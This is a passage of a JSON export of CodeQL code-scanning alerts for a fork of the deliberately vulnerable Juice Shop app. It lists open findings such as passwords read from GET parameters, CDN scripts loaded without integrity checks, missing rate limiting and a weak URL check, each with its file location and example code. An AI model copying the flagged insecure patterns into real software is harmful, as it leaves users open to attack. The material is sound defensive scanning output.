[CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "'://htmledit.squarefree.com' can be anywhere in the URL, and arbitrary hosts may come before or after it."
        },
        "location": {
          "path": "routes/updateUserProfile.ts",
          "start_line": 23,
          "end_line": 23,
          "start_column": 22,
          "end_column": 80
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/98/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 97,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/97",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/97",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/sensitive-get-query",
        "severity": "warning",
        "description": "Sensitive data read from GET request",
        "name": "js/sensitive-get-query",
        "tags": [
          "external/cwe/cwe-598",
          "security"
        ],
        "full_description": "Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.",
        "help": "# Sensitive data read from GET request\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```javascript\nconst express = require('express');\nconst app = express();\napp.use(require('body-parser').urlencoded({ extended: false }))\n\n// bad: sensitive information is read from query parameters\napp.get('/login1', (req, res) => {\n    const user = req.query.user;\n    const password = req.query.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n// good: sensitive information is read from post body\napp.post('/login2', (req, res) => {\n    const user = req.body.user;\n    const password = req.body.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "Route handler for GET requests uses query parameter as sensitive data."
        },
        "location": {
          "path": "routes/changePassword.ts",
          "start_line": 19,
          "end_line": 19,
          "start_column": 28,
          "end_column": 40
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/97/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 96,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/96",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/96",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/sensitive-get-query",
        "severity": "warning",
        "description": "Sensitive data read from GET request",
        "name": "js/sensitive-get-query",
        "tags": [
          "external/cwe/cwe-598",
          "security"
        ],
        "full_description": "Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.",
        "help": "# Sensitive data read from GET request\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```javascript\nconst express = require('express');\nconst app = express();\napp.use(require('body-parser').urlencoded({ extended: false }))\n\n// bad: sensitive information is read from query parameters\napp.get('/login1', (req, res) => {\n    const user = req.query.user;\n    const password = req.query.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n// good: sensitive information is read from post body\napp.post('/login2', (req, res) => {\n    const user = req.body.user;\n    const password = req.body.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "Route handler for GET requests uses query parameter as sensitive data."
        },
        "location": {
          "path": "routes/changePassword.ts",
          "start_line": 17,
          "end_line": 17,
          "start_column": 25,
          "end_column": 34
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/96/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 95,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/95",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/95",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/sensitive-get-query",
        "severity": "warning",
        "description": "Sensitive data read from GET request",
        "name": "js/sensitive-get-query",
        "tags": [
          "external/cwe/cwe-598",
          "security"
        ],
        "full_description": "Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.",
        "help": "# Sensitive data read from GET request\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```javascript\nconst express = require('express');\nconst app = express();\napp.use(require('body-parser').urlencoded({ extended: false }))\n\n// bad: sensitive information is read from query parameters\napp.get('/login1', (req, res) => {\n    const user = req.query.user;\n    const password = req.query.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n// good: sensitive information is read from post body\napp.post('/login2', (req, res) => {\n    const user = req.body.user;\n    const password = req.body.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "Route handler for GET requests uses query parameter as sensitive data."
        },
        "location": {
          "path": "routes/changePassword.ts",
          "start_line": 16,
          "end_line": 16,
          "start_column": 29,
          "end_column": 42
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/95/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 94,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/94",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/94",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/functionality-from-untrusted-source",
        "severity": "warning",
        "description": "Inclusion of functionality from an untrusted source",
        "name": "js/functionality-from-untrusted-source",
        "tags": [
          "external/cwe/cwe-830",
          "security"
        ],
        "full_description": "Including functionality from an untrusted source may allow an attacker to control the functionality and execute arbitrary code.",
        "help": "# Inclusion of functionality from an untrusted source\nIncluding a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.\n\nWhen including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.\n\nEven when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.\n\nSubresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.\n\nA dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.\n\nSee the \\[\\`CUSTOMIZING.md\\`\\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.\n\n\n## Recommendation\nWhen an `iframe` element is used to embed a page, it is important to use an `https` URL.\n\nWhen using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.\n\n\n## Example\nThe following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"http://code.jquery.com/jquery-3.6.0.slim.min.js\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\nInstead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"https://code.jquery.com/jquery-3.6.0.slim.min.js\" integrity=\"sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\n\n## References\n* MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)\n* Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)\n* Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "Script loaded from content delivery network with no integrity check."
        },
        "location": {
          "path": "frontend/src/index.html",
          "start_line": 15,
          "end_line": 15,
          "start_column": 3,
          "end_column": 101
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/94/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 93,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/93",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/93",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/functionality-from-untrusted-source",
        "severity": "warning",
        "description": "Inclusion of functionality from an untrusted source",
        "name": "js/functionality-from-untrusted-source",
        "tags": [
          "external/cwe/cwe-830",
          "security"
        ],
        "full_description": "Including functionality from an untrusted source may allow an attacker to control the functionality and execute arbitrary code.",
        "help": "# Inclusion of functionality from an untrusted source\nIncluding a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.\n\nWhen including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.\n\nEven when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.\n\nSubresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.\n\nA dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.\n\nSee the \\[\\`CUSTOMIZING.md\\`\\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.\n\n\n## Recommendation\nWhen an `iframe` element is used to embed a page, it is important to use an `https` URL.\n\nWhen using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.\n\n\n## Example\nThe following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"http://code.jquery.com/jquery-3.6.0.slim.min.js\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\nInstead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"https://code.jquery.com/jquery-3.6.0.slim.min.js\" integrity=\"sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\n\n## References\n* MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)\n* Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)\n* Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).\n",
        "security_severity_level": "medium"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "Script loaded from content delivery network with no integrity check."
        },
        "location": {
          "path": "frontend/src/index.html",
          "start_line": 16,
          "end_line": 16,
          "start_column": 3,
          "end_column": 86
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/93/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 92,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/92",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/92",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 643,
          "end_line": 643,
          "start_column": 31,
          "end_column": 62
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/92/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 91,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/91",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/91",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 641,
          "end_line": 641,
          "start_column": 33,
          "end_column": 65
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/91/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 90,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/90",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/90",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs a file system access, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 635,
          "end_line": 635,
          "start_column": 60,
          "end_column": 73
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/90/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 89,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/89",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/89",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: 